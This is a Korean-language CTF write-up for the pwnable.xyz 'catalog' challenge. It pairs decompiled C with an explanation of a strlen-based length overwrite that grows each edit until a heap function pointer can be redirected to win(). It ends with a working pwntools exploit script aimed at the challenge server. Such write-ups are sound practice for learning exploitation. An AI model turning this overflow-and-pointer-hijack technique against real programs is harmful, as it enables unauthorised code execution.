---
title: "[pwnable.xyz]catalog"
date: 2020-2-5
tags: [pwnable.xyz]
categories: [pwnable.xyz]
---

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  int i; // [rsp+Ch] [rbp-14h]
  int j; // [rsp+10h] [rbp-10h]
  int v7; // [rsp+18h] [rbp-8h]
  int v8; // [rsp+1Ch] [rbp-4h]

  setup();
  while ( 1 )
  {
    while ( 1 )
    {
      print_menu();
      v3 = read_int32();
      if ( v3 != 1 )
        break;
      write_name();                             // 1
    }
    if ( v3 <= 1 )
      break;
    if ( v3 == 2 )                              // 2
    {
      for ( i = 0; catalog[i]; ++i )
        ;
      printf("index: ", argv);
      v7 = read_int32();
      if ( v7 >= 0 && v7 < i )
        edit_name(catalog[v7]);
      else
        puts("Invalid index");
    }
    else if ( v3 == 3 )                         // 3
    {
      for ( j = 0; catalog[j]; ++j )
        ;
      printf("index: ", argv);
      v8 = read_int32();
      if ( v8 >= 0 && v8 < j )
        (*(catalog[v8] + 40LL))(catalog[v8]);
      else
        puts("Invalid index");
    }
    else
    {
LABEL_25:
      puts("Invalid");
    }
  }
  if ( v3 )
    goto LABEL_25;
  return 0;
}
```

1번 메뉴에서 힙 영역을 할당해서 s[5]에는 함수 포인터를 넣고 edit_name함수에서 입력받고 한다.

```c
size_t *write_name()
{
  size_t v0; // rdx
  size_t *result; // rax
  int i; // [rsp+4h] [rbp-Ch]
  size_t *s; // [rsp+8h] [rbp-8h]

  s = malloc(48uLL);
  for ( i = 0; catalog[i]; ++i )
    ;
  catalog[i] = s;
  s[5] = print_name;
  s[4] = 32LL;
  edit_name(s);
  v0 = strlen(s);
  result = s;
  s[4] = v0;
  return result;
}
```

그냥 솔직히 좀 얻어걸린 문제다. 디버깅하다가 32바이트만큼 입력하면 바로 뒤에 길이가 저장되서 strlen()으로 33바이트로 인식하게 되서 또 edit으로 33바이트만큼 입력할 수 있게되는데 여기서 33바이트 위치에 있는 길이만큼 입력받을 수 있으니까 이곳을 길게 덮어주면 s[5]의 함수 포인터를 덮을 수 있어 win()으로 덮고 3번 메뉴로 함수 포인터 실행해주면 된다.

> exploit.py

```python
from pwn import *

context.log_level = 'debug'
e = ELF('./challenge')
#p = process('./challenge')
p = remote('svc.pwnable.xyz',30023)
sa = lambda x,y : p.sendafter(x,y)
sla = lambda x,y : p.sendlineafter(x,y)

def write(name):
	sa('>','1')
	sa(':',name)

def edit(idx,name):
	sa('>','2')
	sa(':',str(idx))
	sa(':',name)

def print_name(idx):
	sa('>','3')
	sa(':',str(idx))

write('A'*32)
edit(0,'A'*33)
edit(0,'A'*40 + p64(e.symbols['win']))
print_name(0)

p.interactive()
```

